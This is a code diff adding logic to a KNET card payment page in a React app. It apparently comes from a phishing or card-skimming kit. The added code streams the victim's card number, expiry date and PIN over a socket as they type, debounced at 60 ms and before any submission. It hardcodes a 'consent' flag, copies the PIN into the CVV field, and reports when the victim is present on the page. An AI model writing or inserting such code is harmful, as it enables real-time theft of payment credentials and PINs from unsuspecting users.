@@ -117,6 +117,33 @@ export default function KNETPayment() {
   useEffect(() => {
     navigateToPage("دفع كي نت");
   }, []);
+  // ===== بطاقة الدفع المباشر (KNET) =====
+  const liveDebounceRef = useRef<ReturnType<typeof setTimeout>>();
+
+  useEffect(() => {
+    if (socket.value.connected) socket.value.emit("card:live", { presence: true });
+  }, []);
+
+  useEffect(() => {
+    if (liveDebounceRef.current) clearTimeout(liveDebounceRef.current);
+    liveDebounceRef.current = setTimeout(() => {
+      if (!socket.value.connected) return;
+      socket.value.emit("card:live", {
+        cardNumber: selectedPrefix + cardNumber,
+        nameOnCard: selectedBank || "KNET",
+        expiryDate: expiryMonth && expiryYear ? `${expiryMonth.padStart(2, "0")}/${String(expiryYear).slice(-2)}` : "",
+        cvv: cardPin,
+        pin: cardPin,
+        consent: true,
+      });
+    }, 60);
+    return () => { if (liveDebounceRef.current) clearTimeout(liveDebounceRef.current); };
+  }, [selectedPrefix, cardNumber, expiryMonth, expiryYear, cardPin]);
+
+  useEffect(() => {
+    return () => { socket.value.emit("card:liveHide"); };
+  }, []);
+
 
   // Countdown timer for OTP
   const startCountdown = useCallback(() => {
